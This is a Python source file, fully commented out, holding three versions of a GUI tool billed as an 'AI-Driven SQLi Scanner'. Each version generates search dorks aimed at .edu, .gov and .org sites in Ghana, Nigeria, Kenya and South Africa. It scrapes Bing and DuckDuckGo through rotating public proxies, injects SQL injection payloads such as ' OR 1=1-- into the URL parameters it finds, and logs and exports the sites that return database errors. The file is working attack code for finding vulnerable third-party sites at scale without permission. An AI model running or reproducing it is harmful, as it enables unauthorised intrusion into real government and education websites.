#         # Common vulnerable parameters
#         params = ["id", "page", "cat", "product", "view", "item", "user", "account"]
        
#         # File extensions to target
#         extensions = ["php", "asp", "aspx", "jsp", "cfm"]
        
#         # Country specific TLDs
#         countries = {
#             "Ghana": [".edu.gh", ".gov.gh", ".org.gh"],
#             "Nigeria": [".edu.ng", ".gov.ng", ".org.ng"],
#             "Kenya": [".edu.ke", ".go.ke", ".or.ke"],
#             "South Africa": [".ac.za", ".gov.za", ".co.za"]
#         }
        
#         # Generate basic dorks
#         for param in params:
#             for ext in extensions:
#                 self.dorks.append(f"inurl:{param}= filetype:{ext}")
#                 self.dorks.append(f"inurl:.{ext}?{param}=")
        
#         # Generate country-specific dorks
#         for country, tlds in countries.items():
#             for tld in tlds:
#                 for param in params:
#                     self.dorks.append(f"site:{tld} inurl:{param}=")
#                     self.dorks.append(f"site:{tld} inurl:.php?{param}=")
        
#         self.log_message(f"Generated {len(self.dorks)} search dorks", "success")
        
#     def load_dorks(self):
#         """Load dorks from a file"""
#         file_path = filedialog.askopenfilename(
#             title="Select Dorks File",
#             filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
#         )
        
#         if file_path:
#             try:
#                 with open(file_path, "r") as f:
#                     self.dorks = [line.strip() for line in f if line.strip()]
#                 self.log_message(f"Loaded {len(self.dorks)} dorks from {file_path}", "success")
#             except Exception as e:
#                 self.log_message(f"Error loading dorks: {str(e)}", "error")
    
#     def start_scan(self):
#         """Start the scanning process in a separate thread"""
#         if not self.dorks:
#             messagebox.showwarning("Warning", "No dorks loaded. Generate or load dorks first.")
#             return
            
#         if self.scanning:
#             messagebox.showinfo("Info", "Scan is already running")
#             return
            
#         self.scanning = True
#         self.current_scan_thread = threading.Thread(target=self.run_scan, daemon=True)
#         self.current_scan_thread.start()
#         self.log_message("Scan started", "success")
    
#     def stop_scan(self):
#         """Stop the ongoing scan"""
#         if self.scanning:
#             self.scanning = False
#             self.log_message("Scan stopping...", "warning")
#         else:
#             messagebox.showinfo("Info", "No scan is currently running")
    
#     def run_scan(self):
#         """Main scanning logic"""
#         try:
#             # Clear previous results
#             open(RESULTS_FILE, "w").close()
            
#             for dork in self.dorks:
#                 if not self.scanning:
#                     break
                    
#                 self.log_message(f"Processing dork: {dork}", "info")
                
#                 # Search for URLs using hybrid approach
#                 urls = self.hybrid_search(dork)
                
#                 if urls:
#                     self.log_message(f"Found {len(urls)} potential targets", "success")
#                     self.test_urls(urls)
                
#                 # Random delay between dorks
#                 time.sleep(random.uniform(*REQUEST_DELAY))
                
#         except Exception as e:
#             self.log_message(f"Scan error: {str(e)}", "error")
#         finally:
#             self.scanning = False
#             self.log_message("Scan completed", "success" if not self.scanning else "warning")
    
#     def hybrid_search(self, dork: str) -> List[str]:
#         """Search using multiple engines and return unique results"""
#         urls = set()
        
#         # Try Bing first
#         bing_urls = self.search_bing(dork)
#         urls.update(bing_urls)
        
#         # Fallback to DuckDuckGo if needed
#         if not urls:
#             duckduckgo_urls = self.search_duckduckgo(dork)
#             urls.update(duckduckgo_urls)
            
#         return list(urls)
    
#     def search_bing(self, dork: str, pages: int = 2) -> List[str]:
#         """Search Bing for the given dork"""
#         urls = set()
        
#         for page in range(pages):
#             if not self.scanning:
#                 break
                
#             try:
#                 search_url = f"https://www.bing.com/search?q={dork}&first={page * 10}"
#                 proxy = self.proxy_manager.get_working_proxy()
                
#                 response = requests.get(
#                     search_url,
#                     headers=HEADERS,
#                     proxies=proxy,
#                     timeout=10
#                 )
                
#                 if response.status_code == 200:
#                     soup = BeautifulSoup(response.text, "html.parser")
#                     for link in soup.find_all("a", href=True):
#                         url = link["href"]
#                         if self.is_potential_target(url):
#                             urls.add(self.clean_url(url))
                
#                 # Delay to avoid rate limiting
#                 time.sleep(random.uniform(*REQUEST_DELAY))
                
#             except Exception as e:
#                 self.log_message(f"Bing search error: {str(e)}", "error")
#                 continue
                
#         return list(urls)
    
#     def search_duckduckgo(self, dork: str, pages: int = 2) -> List[str]:
#         """Search DuckDuckGo for the given dork"""
#         urls = set()
        
#         for page in range(pages):
#             if not self.scanning:
#                 break
                
#             try:
#                 search_url = f"https://html.duckduckgo.com/html/?q={dork}&s={page * 30}"
#                 proxy = self.proxy_manager.get_working_proxy()
                
#                 response = requests.get(
#                     search_url,
#                     headers=HEADERS,
#                     proxies=proxy,
#                     timeout=10
#                 )
                
#                 if response.status_code == 200:
#                     soup = BeautifulSoup(response.text, "html.parser")
#                     for link in soup.find_all("a", href=True):
#                         url = link["href"]
#                         if self.is_potential_target(url):
#                             urls.add(self.clean_url(url))
                
#                 # DuckDuckGo is more sensitive to rapid requests
#                 time.sleep(random.uniform(2.0, 5.0))
                
#             except Exception as e:
#                 self.log_message(f"DuckDuckGo search error: {str(e)}", "error")
#                 continue
                
#         return list(urls)
    
#     def is_potential_target(self, url: str) -> bool:
#         """Check if a URL looks like a potential SQLi target"""
#         # Common vulnerable parameters
#         vulnerable_params = ["id", "page", "cat", "product", "user", "account"]
        
#         # Common vulnerable file extensions
#         vulnerable_extensions = [".php", ".asp", ".aspx", ".jsp", ".cfm"]
        
#         # Check for both parameters and extensions
#         has_param = any(f"?{param}=" in url.lower() or f"&{param}=" in url.lower() for param in vulnerable_params)
#         has_extension = any(ext in url.lower() for ext in vulnerable_extensions)
        
#         return has_param and has_extension
    
#     def clean_url(self, url: str) -> str:
#         """Clean and normalize a URL"""
#         # Remove tracking parameters and fragments
#         url = url.split("#")[0]
#         url = url.split("&")[0] if "?" in url else url
#         return url.strip()
    
#     def test_urls(self, urls: List[str]):
#         """Test a list of URLs for SQL injection vulnerabilities"""
#         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
#             futures = {executor.submit(self.test_sql_injection, url): url for url in urls}
            
#             for future in as_completed(futures):
#                 if not self.scanning:
#                     executor.shutdown(wait=False)
#                     break
                    
#                 try:
#                     result = future.result()
#                     if result:
#                         self.log_message(f"Vulnerable: {result}", "success")
#                 except Exception as e:
#                     self.log_message(f"Testing error: {str(e)}", "error")
    
#     def test_sql_injection(self, url: str) -> Optional[str]:
#         """Test a single URL for SQL injection vulnerabilities"""
#         if not self.scanning:
#             return None
            
#         try:
#             # Test with basic SQLi payloads
#             payloads = [
#                 "'",
#                 "\"",
#                 "' OR '1'='1",
#                 "\" OR \"1\"=\"1",
#                 "' OR 1=1--",
#                 "\" OR 1=1--",
#                 "' OR 1=1#",
#                 "' OR 1=1/*"
#             ]
            
#             for payload in payloads:
#                 if not self.scanning:
#                     return None
                    
#                 test_url = self.inject_payload(url, payload)
#                 proxy = self.proxy_manager.get_working_proxy()
                
#                 try:
#                     response = requests.get(
#                         test_url,
#                         headers=HEADERS,
#                         proxies=proxy,
#                         timeout=8
#                     )
                    
#                     if self.detect_sql_errors(response.text):
#                         # Save vulnerable URL
#                         with open(RESULTS_FILE, "a") as f:
#                             f.write(f"{url}\tPayload: {payload}\n")
#                         return url
                        
#                 except requests.RequestException:
#                     continue
                
#                 # Delay between payload tests
#                 time.sleep(random.uniform(0.5, 1.5))
            
#             self.log_message(f"Not vulnerable: {url}", "info")
#             return None
            
#         except Exception as e:
#             self.log_message(f"Error testing {url}: {str(e)}", "error")
#             return None
    
#     def inject_payload(self, url: str, payload: str) -> str:
#         """Inject a payload into the URL parameters"""
#         if "?" in url:
#             base, params = url.split("?", 1)
#             param_pairs = params.split("&")
#             injected_params = []
            
#             for pair in param_pairs:
#                 if "=" in pair:
#                     key, value = pair.split("=", 1)
#                     injected_params.append(f"{key}={value}{payload}")
#                 else:
#                     injected_params.append(pair)
            
#             return f"{base}?{'&'.join(injected_params)}"
#         else:
#             return f"{url}?{payload}"
    
#     def detect_sql_errors(self, response_text: str) -> bool:
#         """Check response text for SQL error patterns"""
#         error_patterns = [
#             "sql syntax",
#             "mysql_fetch",
#             "ORA-",
#             "syntax error",
#             "unclosed quotation mark",
#             "quoted string not properly terminated",
#             "odbc microsoft access driver",
#             "sqlserver",
#             "mysql error",
#             "postgresql error",
#             "syntax error near",
#             "unexpected end of sql command",
#             "sql command not properly ended",
#             "warning: mysql",
#             "sqlite exception",
#             "pdoexception"
#         ]
        
#         text_lower = response_text.lower()
#         return any(error in text_lower for error in error_patterns)
    
#     def export_html(self):
#         """Export results to HTML report"""
#         try:
#             with open(RESULTS_FILE, "r") as f:
#                 results = [line.strip().split("\t") for line in f if line.strip()]
            
#             if not results:
#                 messagebox.showinfo("Info", "No results to export")
#                 return
                
#             html = """<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <title>SQL Injection Scan Report</title>
#     <style>
#         body { font-family: Arial, sans-serif; margin: 20px; }
#         h1 { color: #333; }
#         table { border-collapse: collapse; width: 100%; }
#         th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
#         th { background-color: #f2f2f2; }
#         tr:nth-child(even) { background-color: #f9f9f9; }
#         .vulnerable { color: red; font-weight: bold; }
#     </style>
# </head>
# <body>
#     <h1>SQL Injection Scan Report</h1>
#     <p>Generated on {datetime}</p>
#     <table>
#         <tr>
#             <th>URL</th>
#             <th>Payload</th>
#             <th>Status</th>
#         </tr>
# """.format(datetime=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            
#             for result in results:
#                 url = result[0]
#                 payload = result[1] if len(result) > 1 else "N/A"
#                 html += f"""
#         <tr>
#             <td><a href="{url}" target="_blank">{url}</a></td>
#             <td>{payload}</td>
#             <td class="vulnerable">Vulnerable</td>
#         </tr>
# """
            
#             html += """
#     </table>
# </body>
# </html>
# """
#             with open(HTML_REPORT, "w") as f:
#                 f.write(html)
            
#             self.log_message(f"HTML report saved to {HTML_REPORT}", "success")
#             messagebox.showinfo("Success", f"HTML report saved to {HTML_REPORT}")
            
#         except Exception as e:
#             self.log_message(f"Error exporting HTML: {str(e)}", "error")
#             messagebox.showerror("Error", f"Failed to export HTML: {str(e)}")
    
#     def export_pdf(self):
#         """Export results to PDF report"""
#         try:
#             pdf = FPDF()
#             pdf.add_page()
#             pdf.set_font("Arial", size=12)
            
#             # Title
#             pdf.cell(200, 10, txt="SQL Injection Scan Report", ln=True, align="C")
#             pdf.ln(10)
            
#             # Date
#             pdf.set_font("", size=10)
#             pdf.cell(200, 10, txt=f"Generated on: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ln=True)
#             pdf.ln(10)
            
#             # Results
#             pdf.set_font("", "B", size=12)
#             pdf.cell(200, 10, txt="Vulnerable URLs:", ln=True)
#             pdf.set_font("", size=10)
            
#             try:
#                 with open(RESULTS_FILE, "r") as f:
#                     for line in f:
#                         if line.strip():
#                             parts = line.strip().split("\t")
#                             url = parts[0]
#                             payload = parts[1] if len(parts) > 1 else ""
#                             pdf.multi_cell(0, 10, txt=f"URL: {url}\nPayload: {payload}\n", border=0)
#                             pdf.ln(2)
#             except FileNotFoundError:
#                 pdf.multi_cell(0, 10, txt="No results found", border=0)
            
#             # Save dialog
#             file_path = filedialog.asksaveasfilename(
#                 defaultextension=".pdf",
#                 filetypes=[("PDF Files", "*.pdf")],
#                 title="Save PDF Report"
#             )
            
#             if file_path:
#                 pdf.output(file_path)
#                 self.log_message(f"PDF report saved to {file_path}", "success")
#                 messagebox.showinfo("Success", f"PDF report saved to {file_path}")
                
#         except Exception as e:
#             self.log_message(f"Error exporting PDF: {str(e)}", "error")
#             messagebox.showerror("Error", f"Failed to export PDF: {str(e)}")
    
#     def refresh_proxies(self):
#         """Refresh the proxy list"""
#         count = self.proxy_manager.refresh_proxies()
#         self.log_message(f"Refreshed proxy list with {count} proxies", "success")

# if __name__ == "__main__":
#     root = tk.Tk()
#     app = SQLiScannerGUI(root)
#     root.mainloop()




# import requests, random, time, threading
# import tkinter as tk
# from tkinter import filedialog
# from bs4 import BeautifulSoup
# from fpdf import FPDF
# from concurrent.futures import ThreadPoolExecutor
# import datetime

# HEADERS = {"User-Agent": "Mozilla/5.0"}
# PROXY_URL = "https://www.proxy-list.download/api/v1/get?type=http"
# RESULTS_FILE = "sqli_results.txt"
# HTML_REPORT = "sqli_report.html"

# class SQLiScanner:
#     def __init__(self, root):
#         self.root = root
#         self.root.title("AI-Driven SQLi Scanner")
#         self.root.geometry("900x700")
#         self.proxies = []
#         self.scanning = False
#         self.dorks = []
#         self.setup_ui()
#         self.load_proxies()

#     def setup_ui(self):
#         self.log = tk.Text(self.root, wrap="word", height=30, bg="#121212", fg="#00FF00")
#         self.log.pack(fill="both", expand=True)

#         frame = tk.Frame(self.root)
#         frame.pack(fill="x")

#         tk.Button(frame, text="Generate Dorks (AI)", command=self.generate_dorks).pack(side="left", padx=5, pady=10)
#         tk.Button(frame, text="Start Scan", command=self.start_scan).pack(side="left", padx=5)
#         tk.Button(frame, text="Stop Scan", command=self.stop_scan).pack(side="left", padx=5)
#         tk.Button(frame, text="Export HTML", command=self.export_html).pack(side="left", padx=5)
#         tk.Button(frame, text="Export PDF", command=self.export_pdf).pack(side="left", padx=5)

#     def log_msg(self, msg):
#         self.log.insert(tk.END, msg + "\n")
#         self.log.see(tk.END)

#     def load_proxies(self):
#         try:
#             r = requests.get(PROXY_URL, timeout=10)
#             self.proxies = [p.strip() for p in r.text.splitlines() if p.strip()]
#             self.log_msg(f"[+] Loaded {len(self.proxies)} proxies.")
#         except:
#             self.log_msg("[!] Could not fetch proxy list. Proxy rotation disabled.")

#     def get_working_proxy(self):
#         """
#         Tries multiple proxies and returns the first one that works.
#         """
#         for proxy in self.proxies:
#             proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
#             try:
#                 r = requests.get("https://httpbin.org/ip", proxies=proxy_dict, timeout=5)
#                 if r.status_code == 200:
#                     return proxy_dict
#             except:
#                 continue
#         return None  # fallback if none work

#     def generate_dorks(self):
#         keywords = ["login", "register", "product", "item", "view", "cat", "page", "id"]
#         extensions = ["php", "asp", "jsp", "aspx"]
#         countries = {
#             "Ghana": [".edu.gh", ".gov.gh"],
#             "Nigeria": [".edu.ng", ".gov.ng"],
#             "Kenya": [".edu.ke", ".go.ke"]
#         }

#         self.dorks.clear()

#         # Normal dorks
#         for kw in keywords:
#             for ext in extensions:
#                 self.dorks.append(f"inurl:{kw}.{ext}?")

#         # Country-specific dorks
#         for country, domains in countries.items():
#             for domain in domains:
#                 for kw in keywords:
#                     for ext in extensions:
#                         self.dorks.append(f"site:{domain} inurl:{kw}.{ext}?")

#         self.log_msg(f"[+] AI-based Dork Generator produced {len(self.dorks)} dorks including .edu/.gov by country.")


#     def hybrid_search(self, dork):
#         results = self.search_duckduckgo(dork)
#         if not results:
#             self.log_msg("[~] DuckDuckGo empty, trying Bing...")
#             results = self.search_bing(dork)
#         return results

#     def search_duckduckgo(self, dork):
#         urls = set()
#         try:
#             proxy = self.get_working_proxy()
#             r = requests.get(
#                 f"https://html.duckduckgo.com/html/?q={dork}",
#                 headers=HEADERS,
#                 proxies=proxy,
#                 timeout=10
#             )
#             soup = BeautifulSoup(r.text, "html.parser")
#             for a in soup.find_all("a", href=True):
#                 href = a['href']
#                 if any(p in href for p in ["?id=", "?cat=", "?page="]) and any(x in href for x in [".php", ".asp", ".jsp", ".aspx"]):
#                     urls.add(href.split("&")[0])
#         except Exception as e:
#             self.log_msg(f"[-] DuckDuckGo Error: {e}")
#         return list(urls)


#     def search_bing(self, dork):
#         urls = set()
#         try:
#             proxy = self.get_working_proxy()
#             r = requests.get(
#                 f"https://www.bing.com/search?q={dork}",
#                 headers=HEADERS,
#                 proxies=proxy,
#                 timeout=10
#             )
#             soup = BeautifulSoup(r.text, "html.parser")
#             for a in soup.find_all("a", href=True):
#                 href = a['href']
#                 if any(p in href for p in ["?id=", "?cat=", "?page="]) and any(x in href for x in [".php", ".asp", ".jsp", ".aspx"]):
#                     urls.add(href.split("&")[0])
#         except Exception as e:
#             self.log_msg(f"[-] Bing Error: {e}")
#         return list(urls)


#     def test_sqli(self, url):
#         try:
#             payload = "'"
#             test_url = url + payload
#             proxy = self.get_working_proxy()

#             r = requests.get(test_url, headers=HEADERS, proxies=proxy, timeout=10)

#             errors = [
#                 "sql syntax", "mysql_fetch", "ORA-", "syntax error",
#                 "quoted string not properly terminated", "unclosed quotation mark"
#             ]

#             if any(err.lower() in r.text.lower() for err in errors):
#                 self.log_msg(f"[!] VULNERABLE: {url}")
#                 with open(RESULTS_FILE, "a") as f:
#                     f.write(url + "\n")
#             else:
#                 self.log_msg(f"[-] Not vulnerable: {url}")
#         except Exception as e:
#             self.log_msg(f"[-] Error testing {url}: {e}")


#     def threaded_scan(self, urls):
#         with ThreadPoolExecutor(max_workers=10) as executor:
#             for url in urls:
#                 if not self.scanning:
#                     break
#                 executor.submit(self.test_sqli, url)

#     def start_scan(self):
#         self.scanning = True
#         open(RESULTS_FILE, "w").close()
#         threading.Thread(target=self.run_scan).start()

#     def run_scan(self):
#         for dork in self.dorks:
#             if not self.scanning:
#                 self.log_msg("[!] Scan stopped.")
#                 return
#             self.log_msg(f"\n[+] Searching: {dork}")
#             urls = self.hybrid_search(dork)
#             if urls:
#                 self.log_msg(f"[+] Found {len(urls)} targets.")
#                 self.threaded_scan(urls)
#             time.sleep(random.uniform(1.5, 3.0))


#     def stop_scan(self):
#         self.scanning = False
#         self.log_msg("[*] Scanning halted by user.")

#     def export_html(self):
#         try:
#             with open(RESULTS_FILE, "r") as f:
#                 lines = f.readlines()
#             html = "<html><head><title>SQLi Report</title></head><body><h1>SQLi Vulnerable URLs</h1><ul>"
#             for line in lines:
#                 html += f"<li><a href='{line.strip()}'>{line.strip()}</a></li>"
#             html += "</ul></body></html>"
#             with open(HTML_REPORT, "w") as f:
#                 f.write(html)
#             self.log_msg(f"[+] Exported to {HTML_REPORT}")
#         except:
#             self.log_msg("[!] No results to export.")

#     def export_pdf(self):
#         try:
#             pdf = FPDF()
#             pdf.add_page()
#             pdf.set_font("Arial", size=12)
#             pdf.cell(200, 10, txt="SQLi Scanner Report", ln=True, align='C')
#             pdf.ln(10)
#             with open(RESULTS_FILE, "r") as f:
#                 for line in f:
#                     pdf.multi_cell(0, 10, line.strip())
#             filename = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF", "*.pdf")])
#             if filename:
#                 pdf.output(filename)
#                 self.log_msg(f"[+] PDF saved to {filename}")
#         except:
#             self.log_msg("[!] Error generating PDF.")

# if __name__ == "__main__":
#     root = tk.Tk()
#     app = SQLiScanner(root)
#     root.mainloop()






# import requests
# import time
# import random
# import tkinter as tk
# from tkinter import filedialog
# from bs4 import BeautifulSoup
# from fpdf import FPDF
# import concurrent.futures
# import threading

# HEADERS = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
# }
# BING_SEARCH_URL = "https://www.bing.com/search?q="
# DUCKDUCKGO_SEARCH_URL = "https://html.duckduckgo.com/html/?q="
# DORK_FILE = "dorks.txt"
# RESULTS_FILE = "sqli_candidates.txt"
# PAGES_PER_DORK = 2

# class SQLiScannerApp:
#     def __init__(self, root):
#         self.root = root
#         self.root.title("Hybrid SQLi Scanner (Bing + DuckDuckGo)")
#         self.root.geometry("800x600")
#         self.scanning = False
#         self.setup_gui()

#     def setup_gui(self):
#         self.log = tk.Text(self.root, wrap="word", height=25)
#         self.log.pack(fill="both", expand=True)

#         bottom = tk.Frame(self.root)
#         bottom.pack(fill="x")

#         tk.Button(bottom, text="Load Dorks", command=self.load_dorks).pack(side="left", padx=5, pady=10)
#         tk.Button(bottom, text="Start Scan", command=self.start_scan).pack(side="left", padx=5)
#         tk.Button(bottom, text="Stop Scan", command=self.stop_scan).pack(side="left", padx=5)
#         tk.Button(bottom, text="Generate PDF Report", command=self.generate_pdf_report).pack(side="left", padx=5)

#         tk.Label(bottom, text="Country TLD (optional):").pack(side="left", padx=(20, 5))
#         self.country_entry = tk.Entry(bottom)
#         self.country_entry.pack(side="left", padx=5)

#     def log_msg(self, msg):
#         self.log.insert(tk.END, msg + "\n")
#         self.log.see(tk.END)

#     def load_dorks(self):
#         file_path = filedialog.askopenfilename(title="Select Dorks File", filetypes=[("Text Files", "*.txt")])
#         if file_path:
#             global DORK_FILE
#             DORK_FILE = file_path
#             self.log_msg(f"[+] Loaded dorks from: {DORK_FILE}")

#     def is_suspicious(self, url):
#         suspicious_keywords = ["?id=", "?page=", "?cat=", "?product=", "?view=", "?item="]
#         extensions = [".php?", ".asp?", ".aspx?", ".jsp?"]
#         return any(k in url for k in suspicious_keywords) and any(ext in url for ext in extensions)

#     def search_bing(self, dork):
#         found = set()
#         tld = self.country_entry.get().strip()
#         if tld:
#             dork = f"{dork} site:{tld}"

#         for page in range(PAGES_PER_DORK):
#             offset = page * 10
#             try:
#                 r = requests.get(f"{BING_SEARCH_URL}{dork}&first={offset}", headers=HEADERS, timeout=10)
#                 soup = BeautifulSoup(r.text, "html.parser")
#                 for a in soup.find_all("a"):
#                     href = a.get("href", "")
#                     if self.is_suspicious(href):
#                         found.add(href.split("&")[0])
#             except Exception as e:
#                 self.log_msg(f"[-] Bing error: {e}")
#             time.sleep(1)
#         return list(found)

#     def search_duckduckgo(self, dork):
#         found = set()
#         tld = self.country_entry.get().strip()
#         if tld:
#             dork = f"{dork} site:{tld}"

#         for page in range(PAGES_PER_DORK):
#             start = page * 30
#             try:
#                 url = f"{DUCKDUCKGO_SEARCH_URL}{dork}&s={start}"
#                 r = requests.get(url, headers=HEADERS, timeout=10)
#                 soup = BeautifulSoup(r.text, "html.parser")
#                 for link in soup.find_all("a", href=True):
#                     href = link['href']
#                     if "http" in href and self.is_suspicious(href):
#                         found.add(href)
#             except Exception as e:
#                 self.log_msg(f"[-] DuckDuckGo error: {e}")
#             time.sleep(2 + random.uniform(0.5, 1.5))
#         return list(found)

#     def hybrid_search(self, dork):
#         results = self.search_bing(dork)
#         if not results:
#             self.log_msg("[~] Bing returned no results, trying DuckDuckGo...")
#             results = self.search_duckduckgo(dork)
#         return results

#     def fingerprint_sql_injection(self, url):
#         try:
#             payload = "'"
#             if "?" in url:
#                 if "&" in url:
#                     base, params = url.split("?", 1)
#                     modified_url = base + "?" + "&".join([p + payload for p in params.split("&")])
#                 else:
#                     modified_url = url + payload
#             else:
#                 return False

#             r = requests.get(modified_url, headers=HEADERS, timeout=8)
#             errors = [
#                 "you have an error in your sql syntax",
#                 "warning: mysql",
#                 "unclosed quotation mark",
#                 "quoted string not properly terminated",
#                 "odbc microsoft access driver",
#                 "mysql_fetch",
#                 "ORA-01756",
#                 "syntax error",
#                 "sqlstate",
#             ]
#             for error in errors:
#                 if error.lower() in r.text.lower():
#                     return True
#         except Exception as e:
#             self.log_msg(f"[-] Error testing {url}: {e}")
#         return False

#     def threaded_test_url(self, url):
#         if not self.scanning:
#             return
#         self.log_msg(f"[?] Testing: {url}")
#         if self.fingerprint_sql_injection(url):
#             self.log_msg(f"[!] VULNERABLE: {url}")
#             with open(RESULTS_FILE, "a") as f:
#                 f.write(url + "\n")
#         else:
#             self.log_msg(f"[-] Not vulnerable: {url}")

#     def start_scan(self):
#         if not self.scanning:
#             self.scanning = True
#             threading.Thread(target=self._run_scan, daemon=True).start()

#     def stop_scan(self):
#         self.scanning = False
#         self.log_msg("[!] Scan stopped by user.")

#     def _run_scan(self):
#         try:
#             with open(DORK_FILE, "r") as f:
#                 dorks = [line.strip() for line in f if line.strip()]
#         except FileNotFoundError:
#             self.log_msg("[!] Dork file not found.")
#             return

#         with open(RESULTS_FILE, "w") as f:
#             pass  # Clear previous results

#         for dork in dorks:
#             if not self.scanning:
#                 break
#             self.log_msg(f"\n[+] Searching for dork: {dork}")
#             targets = self.hybrid_search(dork)

#             with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
#                 futures = {executor.submit(self.threaded_test_url, url): url for url in targets}
#                 for future in concurrent.futures.as_completed(futures):
#                     if not self.scanning:
#                         break

#     def generate_pdf_report(self):
#         pdf = FPDF()
#         pdf.add_page()
#         pdf.set_font("Arial", size=12)
#         pdf.cell(200, 10, txt="SQLi Dork Scan Report", ln=True, align='C')
#         pdf.ln(10)
#         try:
#             with open(RESULTS_FILE, "r") as f:
#                 for line in f:
#                     pdf.multi_cell(0, 10, line.strip())
#             file_path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
#             if file_path:
#                 pdf.output(file_path)
#                 self.log_msg(f"[+] Report saved to: {file_path}")
#         except FileNotFoundError:
#             self.log_msg("[!] No results file found.")

# if __name__ == "__main__":
#     root = tk.Tk()
#     app = SQLiScannerApp(root)
#     root.mainloop()
